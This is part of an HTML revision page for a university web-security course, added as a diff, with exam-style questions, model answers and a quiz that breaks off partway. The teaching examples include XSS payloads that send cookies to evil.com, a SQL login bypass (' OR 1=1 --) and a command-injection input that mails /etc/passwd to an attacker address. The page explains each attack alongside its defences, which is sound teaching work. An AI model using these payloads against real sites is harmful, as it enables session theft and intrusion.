+    <p>Malicious script is in the URL. Server reflects it back in the response. User clicks a crafted link → script executes. <em>Not stored</em> — only activates when victim clicks the link.</p>
+    <div class="math-box" style="font-size:0.78rem">
+      Attacker crafts URL → Victim clicks → Server echoes script back → Victim's browser executes it
+    </div>
+  </div>
+  <div class="card orange">
+    <h4>Type 2: Stored XSS (Persistent)</h4>
+    <p>Malicious script is stored in the server's database (e.g., in a comment field). Every user who views the page gets the script executed. <em>More dangerous</em> — affects all visitors.</p>
+    <div class="math-box" style="font-size:0.78rem">
+      Attacker injects script → Stored in DB → Any user views page → Script executes
+    </div>
+  </div>
+</div>
+
+<h3>Reflected XSS Example</h3>
+<pre><code><span class="cm">// Vulnerable search page echoes back the query:</span>
+<span class="cm">// URL: https://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</span>
+
+<span class="cm">// Server-side PHP (vulnerable):</span>
+<span class="kw">echo</span> <span class="str">"You searched for: "</span> . <span class="var">$_GET</span>[<span class="str">'q'</span>];
+<span class="cm">// Renders: You searched for: &lt;script&gt;alert('XSS')&lt;/script&gt;</span>
+<span class="cm">// Browser executes the script!</span>
+
+<span class="cm">// Realistic malicious payload — steal cookie:</span>
+<span class="cm">// q=&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</span>
+<span class="cm">// This sends victim's session cookie to the attacker!</span></code></pre>
+
+<h3>Stored XSS Example</h3>
+<pre><code><span class="cm">// Forum/comment system allows HTML (vulnerable):</span>
+<span class="cm">// Attacker posts comment:</span>
+<span class="str">"Great post! &lt;script&gt;
+  fetch('https://evil.com/steal', {
+    method: 'POST',
+    body: document.cookie
+  });
+&lt;/script&gt;"</span>
+
+<span class="cm">// Comment stored in database</span>
+<span class="cm">// Every user who views the page → their cookie is stolen!</span></code></pre>
+
+<h3>Three Attack Perspectives</h3>
+<table>
+  <tr><th>Attack</th><th>What runs where</th><th>Victim</th><th>Goal</th></tr>
+  <tr><td><strong style="color:var(--red)">SQL Injection</strong></td><td>Malicious SQL runs on <em>server DB</em></td><td>Server/Database</td><td>Steal/modify DB data</td></tr>
+  <tr><td><strong style="color:var(--orange)">CSRF</strong></td><td>Attacker site sends requests to <em>victim server</em> using victim's browser</td><td>Server</td><td>Unauthorised actions</td></tr>
+  <tr><td><strong style="color:var(--yellow)">XSS</strong></td><td>Attacker's code runs on <em>victim's browser</em></td><td>Browser/User</td><td>Steal cookies, phish</td></tr>
+</table>
+
+<h3>XSS vs SQL Injection — Know the Difference!</h3>
+<div class="card-grid">
+  <div class="card red">
+    <h4>SQL Injection</h4>
+    <p>Injects <span class="hl-red">SQL commands</span> into a database query. Runs on the <span class="hl-red">server</span>. Can bypass login, dump entire database, modify/delete records. Targets the data tier.</p>
+  </div>
+  <div class="card orange">
+    <h4>Stored XSS</h4>
+    <p>Injects <span class="hl">JavaScript code</span> stored on the server. Runs on the <span class="hl">client browser</span>. Can steal session cookies, redirect users, deface pages, perform phishing. Targets all users.</p>
+  </div>
+</div>
+
+<h3>XSS Defences</h3>
+<div class="card-grid">
+  <div class="card green">
+    <h4>Output Encoding (Best)</h4>
+    <p>Encode special HTML chars before rendering: <code>&lt;</code>→<code>&amp;lt;</code>, <code>&gt;</code>→<code>&amp;gt;</code>. Browser displays text, doesn't execute it.</p>
+    <pre style="font-size:0.78rem"><code><span class="cm">// PHP: htmlspecialchars()</span>
+<span class="kw">echo</span> <span class="fn">htmlspecialchars</span>(<span class="var">$_GET</span>[<span class="str">'q'</span>]);
+<span class="cm">// &lt;script&gt; becomes &amp;lt;script&amp;gt;</span></code></pre>
+  </div>
+  <div class="card accent">
+    <h4>Content Security Policy (CSP)</h4>
+    <p>HTTP header that restricts where scripts can come from. Inline scripts blocked by default. Powerful defence-in-depth.</p>
+    <pre style="font-size:0.78rem"><code>Content-Security-Policy:
+  script-src 'self' https://cdn.example.com;</code></pre>
+  </div>
+  <div class="card purple">
+    <h4>Other Defences</h4>
+    <ul style="padding-left:1.2rem;font-size:0.88rem">
+      <li>Input validation / sanitisation</li>
+      <li>HttpOnly cookies (script can't read)</li>
+      <li>Proxy-based HTTP traffic analysis</li>
+      <li>Application-level firewall</li>
+      <li>Auditing system for JS execution</li>
+    </ul>
+  </div>
+</div>
+</section>
+
+<!-- ═══════════════════════════════════ DEFENCES ═══════════════════════════════════ -->
+<section id="defences">
+<h2>🛡️ Defences, Authentication & Session Security</h2>
+
+<h3>Password Authentication Threats</h3>
+<table>
+  <tr><th>Threat</th><th>How it Works</th><th>Mitigation</th></tr>
+  <tr><td><strong>Brute Force</strong></td><td>Try every combination systematically</td><td>Account lockout after N failures; long passwords</td></tr>
+  <tr><td><strong>Dictionary Attack</strong></td><td>Try common words/passwords from a list</td><td>Require complex passwords; salted hashing</td></tr>
+  <tr><td><strong>Keylogging</strong></td><td>Malware records keystrokes</td><td>MFA; anti-malware; hardware security keys</td></tr>
+  <tr><td><strong>Phishing</strong></td><td>Trick user into entering creds on fake site</td><td>Security awareness training; MFA; FIDO2</td></tr>
+  <tr><td><strong>Shoulder Surfing</strong></td><td>Observer reads password being typed</td><td>Screen privacy protector; awareness</td></tr>
+</table>
+
+<h3>Web App Security — Login Flow</h3>
+<div class="step-list">
+  <div class="step-item"><span><strong>User enters credentials</strong> on login page over HTTPS</span></div>
+  <div class="step-item"><span><strong>Password stored hashed</strong> (bcrypt/Argon2) with salt — never plaintext</span></div>
+  <div class="step-item"><span><strong>Server verifies</strong> hash matches stored hash</span></div>
+  <div class="step-item"><span><strong>2FA challenge</strong> sent (TOTP code to mobile)</span></div>
+  <div class="step-item"><span><strong>Session created</strong> — secure HttpOnly cookie with random session ID</span></div>
+  <div class="step-item"><span><strong>CSRF token</strong> embedded in all subsequent forms</span></div>
+</div>
+
+<h3>Email Security — Phishing Detection</h3>
+<div class="card orange">
+  <h4>What to Check in a Suspicious Email</h4>
+  <ul style="padding-left:1.2rem">
+    <li>Sender email address (does domain match?)</li>
+    <li>Grammar mistakes, unusual language, urgency</li>
+    <li>Unexpected requests (login, payment, personal info)</li>
+    <li>Suspicious attachments claiming to be encrypted PDFs</li>
+    <li>Links — hover to see actual URL, check for http:// vs https://</li>
+  </ul>
+</div>
+
+<div class="card-grid">
+  <div class="card accent">
+    <h4>Forensic Investigation of Email</h4>
+    <ol style="padding-left:1.2rem;font-size:0.88rem">
+      <li><strong>Sender IP address</strong> — from email headers</li>
+      <li><strong>Sender domain</strong> — trace via ipvoid or similar OSINT tool</li>
+      <li><strong>Attachment analysis</strong> — check if malicious (malware scanner, sandboxing)</li>
+    </ol>
+  </div>
+  <div class="card green">
+    <h4>Good Practice Response</h4>
+    <ul style="padding-left:1.2rem;font-size:0.88rem">
+      <li>Do NOT click links or open attachments</li>
+      <li>Report to information security team</li>
+      <li>Warn colleagues to be aware</li>
+      <li>Forward to IT/Security for investigation</li>
+    </ul>
+  </div>
+</div>
+</section>
+
+<!-- ═══════════════════════════════════ EXAM QUESTIONS ═══════════════════════════════════ -->
+<section id="exam">
+<h2>📝 May 2025 Exam Questions — Full Solutions</h2>
+<div class="alert warn"><strong>These are the actual May 2025 exam questions for COMPSCI5063 (Lec 9 relevant questions).</strong></div>
+
+<!-- Q1 -->
+<div class="exam-q">
+  <div class="q-header">
+    <span class="q-num">Q1</span>
+    <span class="q-marks">5 marks</span>
+  </div>
+  <div class="q-text">
+    <p>A company called <em>Travelsafe</em> operates through a website that uses <strong>URL session IDs</strong> (unique numbers assigned by a website server to a user for a specific session after the user's account has been authenticated). This website serves as an exploratory environment where visitors are provided with a search box to identify possible holiday locations.</p>
+    <p style="margin-top:0.5rem"><strong>Mention and describe a potential vulnerability and the corresponding defence mechanisms that can be employed to mitigate it.</strong></p>
+  </div>
+  <button class="toggle-btn" onclick="toggleSolution(this)">Show Solution ▼</button>
+  <div class="solution">
+    <h4 style="color:var(--green)">Model Answer — 5 marks</h4>
+
+    <p><strong>Vulnerability 1 — XSS via Search Box</strong> <span class="mark-badge">2 marks</span></p>
+    <p>The search box accepts user input which is likely reflected back in the page (e.g., "Showing results for: [input]"). An attacker can inject a malicious script: <code>&lt;script&gt;document.location='evil.com/steal?c='+document.cookie&lt;/script&gt;</code>. If URL session IDs are used, the session ID may be in the URL and accessible via <code>document.location</code> or passed in the referer header to external sites.</p>
+
+    <p style="margin-top:0.6rem"><strong>Vulnerability 2 — Session Hijacking via URL Session ID</strong> <span class="mark-badge">1 mark</span></p>
+    <p>Since the session ID is in the URL (e.g., <code>travelsafe.com/search?session=abc123&q=Paris</code>), it can be leaked through: browser history, server access logs, referer headers when clicking external links, or shoulder surfing. Attacker who obtains the session ID can impersonate the user.</p>
+
+    <p style="margin-top:0.6rem"><strong>Defence Mechanisms</strong> <span class="mark-badge">2 marks</span></p>
+    <ul style="padding-left:1.2rem;margin-top:0.4rem">
+      <li><strong>Output encoding</strong>: encode all search input before rendering (htmlspecialchars) → prevents XSS</li>
+      <li><strong>Move session ID to cookie</strong>: use HttpOnly + Secure cookie flags instead of URL parameters</li>
+      <li><strong>CSRF token</strong>: unique per session, validated server-side</li>
+      <li><strong>HTTPS</strong>: encrypts session ID in transit</li>
+      <li><strong>Session timeout</strong>: short-lived session IDs reduce hijack window</li>
+    </ul>
+
+    <div class="alert info" style="margin-top:0.8rem">
+      <strong>Examiner's note:</strong> Full marks for identifying XSS as the vulnerability (given the search box) + URL session ID leakage. Must include defences for both. Mentioning SQL injection also valid if search box is DB-backed.
+    </div>
+  </div>
+</div>
+
+<!-- Q2 (SSO - Lec 8 overlap) -->
+<div class="exam-q">
+  <div class="q-header">
+    <span class="q-num">Q2</span>
+    <span class="q-marks">7 marks</span>
+  </div>
+  <div class="q-text">
+    <p>Some companies, including Google and Amazon, use <strong>Single Sign-On (SSO)</strong> for user authentication, which enhances security.</p>
+    <p style="margin-top:0.5rem"><strong>(1)</strong> Argue for the advantages and disadvantages of using SSO over traditional approaches. <span class="mark-badge">4 marks</span></p>
+    <p style="margin-top:0.3rem"><strong>(2)</strong> Explain what SSO means for: Confidentiality, Integrity, Authenticity, Accountability, and Non-repudiation. <span class="mark-badge">3 marks</span></p>
+  </div>
+  <button class="toggle-btn" onclick="toggleSolution(this)">Show Solution ▼</button>
+  <div class="solution">
+    <h4 style="color:var(--green)">Model Answer</h4>
+
+    <p><strong>Part 1 — Advantages of SSO</strong></p>
+    <ul style="padding-left:1.2rem">
+      <li><strong>Usability</strong>: one set of credentials for multiple services → fewer passwords to remember → users less likely to reuse weak passwords</li>
+      <li><strong>Reduced attack surface</strong>: fewer password databases to protect; single point of hardening</li>
+      <li><strong>Centralised security policy</strong>: enforce MFA, password complexity from one place</li>
+      <li><strong>Faster revocation</strong>: disable one account → access to all services immediately revoked</li>
+    </ul>
+
+    <p style="margin-top:0.6rem"><strong>Part 1 — Disadvantages of SSO</strong></p>
+    <ul style="padding-left:1.2rem">
+      <li><strong>Single point of failure</strong>: if SSO server is down, no access to any service</li>
+      <li><strong>Single point of compromise</strong>: if attacker gets SSO credentials, they access everything</li>
+      <li><strong>Privacy</strong>: identity provider can track which services you use</li>
+      <li><strong>Complexity</strong>: implementation is complex; misconfiguration is dangerous</li>
+    </ul>
+
+    <p style="margin-top:0.6rem"><strong>Part 2 — CIA + AN Properties</strong></p>
+    <table style="font-size:0.85rem">
+      <tr><th>Property</th><th>SSO Impact</th></tr>
+      <tr><td><strong>Confidentiality</strong></td><td>Single credential protects all services; if credentials compromised, all services exposed. Use MFA to strengthen.</td></tr>
+      <tr><td><strong>Integrity</strong></td><td>Centralised auth token ensures only authenticated users modify data; token tampering detected by signature.</td></tr>
+      <tr><td><strong>Authenticity</strong></td><td>Strong authentication at SSO point confirms identity; all downstream services trust the SSO assertion.</td></tr>
+      <tr><td><strong>Accountability</strong></td><td>All actions tied to single identity → comprehensive audit log across all services.</td></tr>
+      <tr><td><strong>Non-repudiation</strong></td><td>Single authenticated session creates clear evidence of who performed which action — harder to deny.</td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- Week 10 Tutorial Q1 -->
+<div class="exam-q">
+  <div class="q-header">
+    <span class="q-num">Tutorial Q1</span>
+    <span class="q-marks">Week 10 Lab</span>
+  </div>
+  <div class="q-text">
+    <p><strong>What are the threat models for password-based user authentication? What are the mitigation methods?</strong></p>
+  </div>
+  <button class="toggle-btn" onclick="toggleSolution(this)">Show Solution ▼</button>
+  <div class="solution">
+    <h4 style="color:var(--green)">Model Answer</h4>
+    <table style="font-size:0.85rem">
+      <tr><th>Threat</th><th>Description</th><th>Mitigation</th></tr>
+      <tr><td>Brute Force</td><td>Systematically try all combinations</td><td>Account lockout; CAPTCHA; long passwords</td></tr>
+      <tr><td>Dictionary Attack</td><td>Use common password wordlists</td><td>Complex passwords; salted hashing (bcrypt)</td></tr>
+      <tr><td>Malware/Keylogging</td><td>Record keystrokes on device</td><td>MFA; AV software; hardware keys</td></tr>
+      <tr><td>Phishing</td><td>Fake site captures credentials</td><td>MFA; security awareness; FIDO2/passkeys</td></tr>
+      <tr><td>Shoulder Surfing</td><td>Physical observation</td><td>Privacy screen; awareness; virtual keyboard</td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- Week 10 Tutorial Q3 -->
+<div class="exam-q">
+  <div class="q-header">
+    <span class="q-num">Tutorial Q3</span>
+    <span class="q-marks">Week 10 Lab</span>
+  </div>
+  <div class="q-text">
+    <p>Aleta works at financial company XCORP and receives a suspicious email urging her to log in and download "salary summary 2019.pdf".</p>
+    <p style="margin-top:0.5rem"><strong>(a)</strong> What should Aleta check and what is good practice as a next step?</p>
+    <p style="margin-top:0.3rem"><strong>(b)</strong> The information risk management team investigates. Mention 3 things they can identify from the email and how.</p>
+  </div>
+  <button class="toggle-btn" onclick="toggleSolution(this)">Show Solution ▼</button>
+  <div class="solution">
+    <h4 style="color:var(--green)">Model Answer</h4>
+    <p><strong>(a) What to check:</strong></p>
+    <ul style="padding-left:1.2rem;margin-bottom:0.6rem">
+      <li>Sender's email address — does the domain match the company it claims to be from?</li>
+      <li>Grammar/spelling mistakes and unusual language</li>
+      <li>Urgency or unusual requests (login, payment, personal info)</li>
+      <li>Suspicious attachment claiming to be encrypted</li>
+      <li>Any links — hover to check actual URL destination</li>
+    </ul>
+    <p><strong>Good practice:</strong> Do NOT click links or open the attachment. Report to the information security/IT team. Inform colleagues to be vigilant.</p>
+
+    <p style="margin-top:0.6rem"><strong>(b) Three things the investigation team identifies:</strong></p>
+    <ol style="padding-left:1.2rem">
+      <li><strong>Sender IP address</strong> — extracted from email headers (e.g., "Received: from [IP]..."); can geolocate the sender</li>
+      <li><strong>Sender domain</strong> — investigate the domain using OSINT tools (ipvoid, whois, MXToolbox) to see if it is a known malicious domain</li>
+      <li><strong>Attachment analysis</strong> — submit attachment to malware scanner (VirusTotal, Cuckoo sandbox) to determine if it contains malicious code</li>
+    </ol>
+  </div>
+</div>
+</section>
+
+<!-- ═══════════════════════════════════ EXTRA QUESTIONS ═══════════════════════════════════ -->
+<section id="extra">
+<h2>➕ Extra Practice Questions (Exam-Style)</h2>
+
+<!-- Extra Q1 -->
+<div class="exam-q">
+  <div class="q-header">
+    <span class="q-num">Extra Q1</span>
+    <span class="q-marks">8 marks</span>
+  </div>
+  <div class="q-text">
+    <p>A social media platform allows users to post comments. An attacker discovers the platform does not sanitise HTML in comment fields.</p>
+    <p style="margin-top:0.5rem"><strong>(a)</strong> Name the type of attack possible and explain why it is particularly dangerous here compared to reflected XSS. [4 marks]</p>
+    <p style="margin-top:0.3rem"><strong>(b)</strong> Write pseudocode or example payload showing how the attacker steals session cookies. [2 marks]</p>
+    <p style="margin-top:0.3rem"><strong>(c)</strong> Describe two specific defence mechanisms. [2 marks]</p>
+  </div>
+  <button class="toggle-btn" onclick="toggleSolution(this)">Show Solution ▼</button>
+  <div class="solution">
+    <h4 style="color:var(--green)">Solution</h4>
+    <p><strong>(a) Stored (Persistent) XSS</strong> — Dangerous because: the script is stored in the server's database permanently. Every user who views the affected page executes the malicious code, not just the one who clicks a crafted link. Scale: 1 attack affects thousands of users. Reflected XSS requires each victim to click a malicious link.</p>
+    <p style="margin-top:0.6rem"><strong>(b) Payload:</strong></p>
+    <pre><code><span class="cm">// Attacker posts this as a "comment":</span>
+&lt;<span class="kw">script</span>&gt;
+  <span class="fn">fetch</span>(<span class="str">'https://evil-attacker.com/steal?cookie='</span>
+    + <span class="fn">encodeURIComponent</span>(document.cookie));
+&lt;/<span class="kw">script</span>&gt;
+<span class="cm">// document.cookie contains the session ID</span>
+<span class="cm">// Attacker uses stolen session ID to impersonate victim</span></code></pre>
+    <p style="margin-top:0.6rem"><strong>(c) Defences:</strong></p>
+    <ul style="padding-left:1.2rem">
+      <li><strong>Output encoding</strong>: use <code>htmlspecialchars()</code> — converts <code>&lt;script&gt;</code> to harmless text <code>&amp;lt;script&amp;gt;</code></li>
+      <li><strong>HttpOnly cookie flag</strong>: session cookie marked HttpOnly cannot be accessed by JavaScript (<code>document.cookie</code> returns empty)</li>
+    </ul>
+  </div>
+</div>
+
+<!-- Extra Q2 -->
+<div class="exam-q">
+  <div class="q-header">
+    <span class="q-num">Extra Q2</span>
+    <span class="q-marks">6 marks</span>
+  </div>
+  <div class="q-text">
+    <p>An online forum has the following PHP login code:</p>
+    <pre><code>$user = $_POST['username'];
+$pass = $_POST['password'];
+$sql = "SELECT * FROM users WHERE username='$user' AND password='$pass'";</code></pre>
+    <p style="margin-top:0.5rem"><strong>(a)</strong> What attack is possible and what would an attacker enter to bypass authentication? [3 marks]</p>
+    <p style="margin-top:0.3rem"><strong>(b)</strong> Rewrite the code securely using parameterised queries. [2 marks]</p>
+    <p style="margin-top:0.3rem"><strong>(c)</strong> What additional change should be made to the stored password? [1 mark]</p>
+  </div>
+  <button class="toggle-btn" onclick="toggleSolution(this)">Show Solution ▼</button>
+  <div class="solution">
+    <h4 style="color:var(--green)">Solution</h4>
+    <p><strong>(a) SQL Injection.</strong> Attacker enters username: <code>' OR 1=1 --</code> (any password). Resulting query:</p>
+    <pre><code>SELECT * FROM users WHERE username='' OR 1=1 --' AND password='x'
+<span class="cm">-- OR 1=1 is always true; -- comments out the password check</span>
+<span class="cm">-- Returns all users; application logs in as first/admin user</span></code></pre>
+    <p style="margin-top:0.6rem"><strong>(b) Secure rewrite:</strong></p>
+    <pre><code><span class="var">$stmt</span> = <span class="var">$pdo</span>-><span class="fn">prepare</span>(<span class="str">"SELECT * FROM users WHERE username=? AND password=?"</span>);
+<span class="var">$stmt</span>-><span class="fn">execute</span>([<span class="var">$user</span>, <span class="fn">hash</span>(<span class="str">'sha256'</span>, <span class="var">$pass</span>)]);</code></pre>
+    <p style="margin-top:0.6rem"><strong>(c)</strong> Passwords should be stored as <strong>salted hashes</strong> (bcrypt or Argon2), not plaintext or simple SHA-256. A salt is a random value added before hashing to prevent rainbow table attacks.</p>
+  </div>
+</div>
+
+<!-- Extra Q3 -->
+<div class="exam-q">
+  <div class="q-header">
+    <span class="q-num">Extra Q3</span>
+    <span class="q-marks">7 marks</span>
+  </div>
+  <div class="q-text">
+    <p><strong>Compare and contrast SQL Injection, CSRF, and XSS attacks.</strong> For each: state what it targets, how it works, and one specific defence. Present your answer in a structured format. [7 marks]</p>
+  </div>
+  <button class="toggle-btn" onclick="toggleSolution(this)">Show Solution ▼</button>
+  <div class="solution">
+    <h4 style="color:var(--green)">Solution</h4>
+    <table style="font-size:0.85rem">
+      <tr><th>Attack</th><th>Targets</th><th>Mechanism</th><th>Defence</th></tr>
+      <tr>
+        <td><strong>SQL Injection</strong></td>
+        <td>Server-side database</td>
+        <td>Malicious SQL embedded in user input; changes meaning of DB query; can bypass auth, dump/modify data</td>
+        <td>Prepared statements / parameterised queries</td>
+      </tr>
+      <tr>
+        <td><strong>CSRF</strong></td>
+        <td>Victim server (via victim's authenticated browser)</td>
+        <td>Attacker tricks victim's browser into sending authenticated request to legitimate server; browser auto-sends session cookies</td>
+        <td>CSRF token (unique secret per session, validated server-side)</td>
+      </tr>
+      <tr>
+        <td><strong>XSS</strong></td>
+        <td>Victim's browser / other users</td>
+        <td>Malicious JavaScript injected into trusted website; executes in victim's browser context; can steal cookies, redirect, phish</td>
+        <td>Output encoding (htmlspecialchars); HttpOnly cookies</td>
+      </tr>
+    </table>
+    <p style="margin-top:0.6rem"><strong>Key distinguishing factor:</strong> SQL injection exploits the <em>server's database</em>; CSRF exploits the <em>user's authenticated session</em>; XSS exploits <em>trust in the website</em> to execute attacker code in victims' browsers.</p>
+  </div>
+</div>
+
+<!-- Extra Q4 -->
+<div class="exam-q">
+  <div class="q-header">
+    <span class="q-num">Extra Q4</span>
+    <span class="q-marks">5 marks</span>
+  </div>
+  <div class="q-text">
+    <p>Explain the difference between <strong>Reflected XSS</strong> and <strong>Stored XSS</strong>. In each case, describe: (1) how the attack is delivered, (2) who is affected, and (3) give a realistic scenario. [5 marks]</p>
+  </div>
+  <button class="toggle-btn" onclick="toggleSolution(this)">Show Solution ▼</button>
+  <div class="solution">
+    <h4 style="color:var(--green)">Solution</h4>
+    <div class="card-grid">
+      <div class="card red">
+        <h4>Reflected XSS</h4>
+        <p><strong>Delivery:</strong> Attacker sends victim a crafted URL containing the script (e.g., via phishing email). Script is reflected back in the server's response.</p>
+        <p><strong>Affected:</strong> Only users who click the specific malicious link.</p>
+        <p><strong>Scenario:</strong> Search engine echoes query in page. Attacker emails link: <code>shop.com/search?q=&lt;script&gt;...&lt;/script&gt;</code>. Victim clicks, their session cookie stolen.</p>
+      </div>
+      <div class="card orange">
+        <h4>Stored XSS</h4>
+        <p><strong>Delivery:</strong> Attacker posts malicious script in a form field (comment, profile, message) that is stored in the database and rendered to all users.</p>
+        <p><strong>Affected:</strong> All users who view the affected page — potentially thousands.</p>
+        <p><strong>Scenario:</strong> Attacker posts a comment containing <code>&lt;script&gt;...steal cookie...&lt;/script&gt;</code> on a popular news site. Every reader of that article has their session hijacked.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Extra Q5 -->
+<div class="exam-q">
+  <div class="q-header">
+    <span class="q-num">Extra Q5</span>
+    <span class="q-marks">6 marks</span>
+  </div>
+  <div class="q-text">
+    <p>A healthcare website uses session IDs stored as URL parameters. Explain <strong>three distinct risks</strong> this creates and propose <strong>three specific mitigations</strong>. [6 marks]</p>
+  </div>
+  <button class="toggle-btn" onclick="toggleSolution(this)">Show Solution ▼</button>
+  <div class="solution">
+    <h4 style="color:var(--green)">Solution</h4>
+    <p><strong>Risks:</strong></p>
+    <ol style="padding-left:1.2rem">
+      <li><strong>Referer header leakage</strong>: When user clicks an external link from a page with a session ID URL, the full URL (including session ID) is sent in the HTTP Referer header to the external server.</li>
+      <li><strong>Browser history / bookmarks</strong>: Session ID stored permanently in browser history; if device is shared or stolen, attacker can replay the session.</li>
+      <li><strong>Server access logs</strong>: Session IDs appear in server logs in plaintext; any log access by an insider or attacker reveals active sessions.</li>
+    </ol>
+    <p style="margin-top:0.6rem"><strong>Mitigations:</strong></p>
+    <ol style="padding-left:1.2rem">
+      <li>Move session IDs to <strong>HttpOnly + Secure cookies</strong> — not visible in URL, not accessible via JS, only sent over HTTPS.</li>
+      <li>Implement <strong>session timeouts</strong> — short expiry minimises window of exploitation even if ID is leaked.</li>
+      <li>Use <strong>HTTPS exclusively</strong> and include <code>Referrer-Policy: no-referrer</code> header to prevent URL leakage to external sites.</li>
+    </ol>
+  </div>
+</div>
+
+<!-- Extra Q6 — Command Injection -->
+<div class="exam-q">
+  <div class="q-header">
+    <span class="q-num">Extra Q6</span>
+    <span class="q-marks">5 marks</span>
+  </div>
+  <div class="q-text">
+    <p>The following PHP code is used on a web server:</p>
+    <pre><code>$email = $_POST['email'];
+$subject = $_POST['subject'];
+system("mail $email -s $subject &lt; /tmp/joinmynetwork");</code></pre>
+    <p style="margin-top:0.5rem"><strong>(a)</strong> What type of attack does this enable? [1 mark]</p>
+    <p><strong>(b)</strong> Show an example of a malicious input that would exfiltrate the server's password file. [2 marks]</p>
+    <p><strong>(c)</strong> Describe two ways to prevent this attack. [2 marks]</p>
+  </div>
+  <button class="toggle-btn" onclick="toggleSolution(this)">Show Solution ▼</button>
+  <div class="solution">
+    <h4 style="color:var(--green)">Solution</h4>
+    <p><strong>(a) Command Injection</strong> (also known as OS Command Injection) — user input is unsafely passed to a system shell command.</p>
+    <p style="margin-top:0.6rem"><strong>(b) Malicious input:</strong></p>
+    <pre><code>email = hacker@evil.com
+subject = <span class="str">foo &lt; /etc/passwd; ls</span>
+<span class="cm">-- Resulting command:</span>
+mail hacker@evil.com -s foo &lt; /etc/passwd; ls
+<span class="cm">-- /etc/passwd contents emailed to attacker, then ls executes</span></code></pre>
+    <p style="margin-top:0.6rem"><strong>(c) Prevention:</strong></p>
+    <ul style="padding-left:1.2rem">
+      <li><strong>Input validation/sanitisation</strong>: whitelist only alphanumeric characters and @/. for email; reject semicolons, pipes, redirects</li>
+      <li><strong>Avoid system() with user input</strong>: use a proper mail library (PHPMailer, SwiftMailer) that doesn't invoke shell; never pass user data directly to shell functions</li>
+    </ul>
+  </div>
+</div>
+</section>
+
+<!-- ═══════════════════════════════════ QUIZ ═══════════════════════════════════ -->
+<section id="quiz">
+<h2>🧠 10-Question Practice Quiz</h2>
+<div id="quizContainer">
+
+  <div class="quiz-q" id="q1">
+    <div class="question">1. Which attack inserts malicious SQL into user input to manipulate a database query?</div>
+    <label class="quiz-option"><input type="radio" name="q1" value="a"> <span>A. Cross-Site Scripting (XSS)</span></label>
+    <label class="quiz-option"><input type="radio" name="q1" value="b"> <span>B. SQL Injection</span></label>
+    <label class="quiz-option"><input type="radio" name="q1" value="c"> <span>C. CSRF</span></label>
+    <label class="quiz-option"><input type="radio" name="q1" value="d"> <span>D. Command Injection</span></label>
+    <div class="quiz-explain" id="q1-exp">
+      <strong>Answer: B — SQL Injection.</strong> The attacker embeds SQL syntax (e.g., <code>' OR 1=1 --</code>) into input fields. The server builds a SQL query by concatenating this input, altering the query's logic. XSS targets the browser; CSRF forges requests; Command Injection targets OS shell.
+    </div>
+  </div>
+
+  <div class="quiz-q" id="q2">
+    <div class="question">2. What is the BEST defence against SQL injection?</div>
+    <label class="quiz-option"><input type="radio" name="q2" value="a"> <span>A. Input length limits</span></label>
+    <label class="quiz-option"><input type="radio" name="q2" value="b"> <span>B. Using HTTPS</span></label>
+    <label class="quiz-option"><input type="radio" name="q2" value="c"> <span>C. Parameterised / Prepared SQL statements</span></label>
+    <label class="quiz-option"><input type="radio" name="q2" value="d"> <span>D. Disabling JavaScript</span></label>
+    <div class="quiz-explain" id="q2-exp">
+      <strong>Answer: C — Prepared Statements.</strong> With parameterised queries, user input is passed as data, never interpreted as SQL. Length limits are trivially bypassed. HTTPS doesn't affect server-side SQL. JS has nothing to do with SQL injection.
+    </div>
+  </div>
+
+  <div class="quiz-q" id="q3">
+    <div class="question">3. A CSRF attack works by:</div>
+    <label class="quiz-option"><input type="radio" name="q3" value="a"> <span>A. Stealing the user's password directly</span></label>
+    <label class="quiz-option"><input type="radio" name="q3" value="b"> <span>B. Tricking the victim's browser into making authenticated requests to a legitimate site</span></label>
+    <label class="quiz-option"><input type="radio" name="q3" value="c"> <span>C. Injecting JavaScript into a trusted site's pages</span></label>
+    <label class="quiz-option"><input type="radio" name="q3" value="d"> <span>D. Intercepting network traffic between client and server</span></label>
+    <div class="quiz-explain" id="q3-exp">
+      <strong>Answer: B.</strong> CSRF exploits the fact that browsers automatically attach session cookies to requests. The attacker's evil site makes the victim's browser send a forged request. The server sees a valid cookie and executes the action.
+    </div>
+  </div>
+
+  <div class="quiz-q" id="q4">
+    <div class="question">4. Stored XSS is more dangerous than Reflected XSS because:</div>
+    <label class="quiz-option"><input type="radio" name="q4" value="a"> <span>A. It only affects users who click a malicious link</span></label>
+    <label class="quiz-option"><input type="radio" name="q4" value="b"> <span>B. It affects all users who view the infected page, automatically</span></label>
+    <label class="quiz-option"><input type="radio" name="q4" value="c"> <span>C. It requires the attacker to be on the same network</span></label>
+    <label class="quiz-option"><input type="radio" name="q4" value="d"> <span>D. It only works over HTTP, not HTTPS</span></label>
+    <div class="quiz-explain" id="q4-exp">
+      <strong>Answer: B.</strong> Stored XSS persists in the database. Any user who loads the page executes the script — no crafted link needed. Reflected XSS only triggers when a victim clicks a specific malicious URL.
+    </div>
+  </div>
+
+  <div class="quiz-q" id="q5">
+    <div class="question">5. Which defence specifically prevents a CSRF token attack?</div>
+    <label class="quiz-option"><input type="radio" name="q5" value="a"> <span>A. Output encoding (htmlspecialchars)</span></label>
+    <label class="quiz-option"><input type="radio" name="q5" value="b"> <span>B. Prepared SQL statements</span></label>
+    <label class="quiz-option"><input type="radio" name="q5" value="c"> <span>C. CSRF session token embedded in forms</span></label>
+    <label class="quiz-option"><input type="radio" name="q5" value="d"> <span>D. Disabling cookies entirely</span></label>
+    <div class="quiz-explain" id="q5-exp">
+      <strong>Answer: C — CSRF token.</strong> A unique, random token embedded in each form. The attacker's site cannot read this token (same-origin policy). Server validates token on submission — forged requests without the token are rejected.
+    </div>
+  </div>
+
+  <div class="quiz-q" id="q6">
+    <div class="question">6. The <code>--</code> in <code>' OR 1=1 --</code> SQL injection payload does what?</div>
+    <label class="quiz-option"><input type="radio" name="q6" value="a"> <span>A. Terminates the SQL connection</span></label>
+    <label class="quiz-option"><input type="radio" name="q6" value="b"> <span>B. Comments out the rest of the SQL query (removes password check)</span></label>
+    <label class="quiz-option"><input type="radio" name="q6" value="c"> <span>C. Selects all tables</span></label>
+    <label class="quiz-option"><input type="radio" name="q6" value="d"> <span>D. Drops the database</span></label>
+    <div class="quiz-explain" id="q6-exp">
